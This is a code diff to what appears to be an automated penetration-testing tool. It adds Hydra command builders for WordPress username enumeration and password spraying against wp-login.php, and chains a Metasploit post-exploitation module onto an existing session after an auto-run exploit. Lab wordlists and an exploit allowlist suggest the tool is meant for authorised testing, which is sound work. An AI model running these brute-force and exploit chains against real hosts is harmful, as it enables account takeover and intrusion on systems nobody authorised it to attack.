@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import os
 import shlex
+from pathlib import Path
 
 from V5.models import PathStep
 from V5.runtime.allowlist import _is_exploit_family, _normalize_tool
@@ -15,6 +16,9 @@ CredentialPair = tuple[str, str]
 # unknown users, so F=Invalid treats every wrong password for a valid user as a hit.
 WP_LOGIN_FORM = (
     '"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=login_error"'
+)
+WP_USER_ENUM_FORM = (
+    '"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=Invalid username"'
 )
 
 # Tools for which we ship a deterministic auto-run template (non-exploit).
@@ -41,6 +45,7 @@ def suggest_command(
     *,
     for_auto_exploit: bool = False,
     credentials: list[CredentialPair] | None = None,
+    followup_module: str | None = None,
 ) -> str:
     tool = _normalize_tool(step.tool)
     ip = step.target_ip
@@ -90,6 +95,7 @@ def suggest_command(
             port,
             for_auto_exploit=for_auto_exploit,
             credentials=credentials,
+            followup_module=followup_module,
         )
 
     if tool in {"john", "hashcat"}:
@@ -142,6 +148,7 @@ def compile_autorun_command(
     *,
     allow_auto_exploits: bool = False,
     credentials: list[CredentialPair] | None = None,
+    followup_module: str | None = None,
 ) -> str | None:
     """Return an executable command string, or None if not auto-runnable."""
 
@@ -149,16 +156,63 @@ def compile_autorun_command(
     if _is_exploit_family(tool):
         if not allow_auto_exploits:
             return None
-        return suggest_command(step, for_auto_exploit=True, credentials=credentials)
+        return suggest_command(
+            step,
+            for_auto_exploit=True,
+            credentials=credentials,
+            followup_module=followup_module,
+        )
 
     if not has_autorun_template(step.tool, allow_auto_exploits=allow_auto_exploits):
         return None
-    suggested = suggest_command(step, credentials=credentials)
+    suggested = suggest_command(step, credentials=credentials, followup_module=followup_module)
     # Strip review comments for execution
     command = suggested.split("#", 1)[0].strip()
     if not command:
         return None
     return command
+
+
+def compile_hydra_command(
+    step: PathStep,
+    *,
+    phase: str = "password",
+    users: list[str] | None = None,
+    passwords_file: str | None = None,
+) -> str:
+    """Build a WP Hydra command: user enum (F=Invalid username) or password spray."""
+    ip = step.target_ip
+    hydra_mod = _hydra_module(step)
+    hydra_port = _hydra_port(step, hydra_mod)
+    port_flag = f"-s {hydra_port} " if hydra_port else ""
+    if hydra_mod in {"http-get", "https-get"}:
+        hydra_mod = "http-post-form" if hydra_mod == "http-get" else "https-post-form"
+    elif hydra_mod in {"http-post-form", "https-post-form"}:
+        pass
+    else:
+        hydra_mod = "http-post-form"
+
+    if phase == "enum":
+        users_file = resolve_lab_wordlist("users")
+        return (
+            f"hydra -I -t 4 {port_flag}-L {users_file} -p x {ip} {hydra_mod} "
+            f"{WP_USER_ENUM_FORM}"
+        )
+
+    safe_users = [_msf_literal(user) for user in (users or []) if user]
+    if len(safe_users) == 1:
+        login_flag = f"-l {safe_users[0]} "
+    elif safe_users:
+        found = Path("lab_users.found.txt")
+        found.write_text("\n".join(safe_users) + "\n", encoding="utf-8")
+        login_flag = f"-L {found} "
+    else:
+        login_flag = f"-L {resolve_lab_wordlist('users')} "
+    passwords = passwords_file or resolve_lab_wordlist("passwords")
+    return (
+        f"hydra -I -t 4 {port_flag}{login_flag}-P {passwords} {ip} {hydra_mod} "
+        f"{WP_LOGIN_FORM}"
+    )
 
 
 def module_needs_login_credentials(tool: str) -> bool:
@@ -174,6 +228,7 @@ def _msfconsole_command(
     *,
     for_auto_exploit: bool,
     credentials: list[CredentialPair] | None,
+    followup_module: str | None = None,
 ) -> str:
     statements = [f"use {module}", f"set RHOSTS {ip}"]
     if port:
@@ -188,6 +243,10 @@ def _msfconsole_command(
     statements.append("check")
     if for_auto_exploit:
         statements.append("run")
+        if followup_module:
+            statements.append(f"use {followup_module}")
+            statements.append("set SESSION 1")
+            statements.append("run")
         statements.append("exit")
     script = "; ".join(statements)
     if for_auto_exploit:
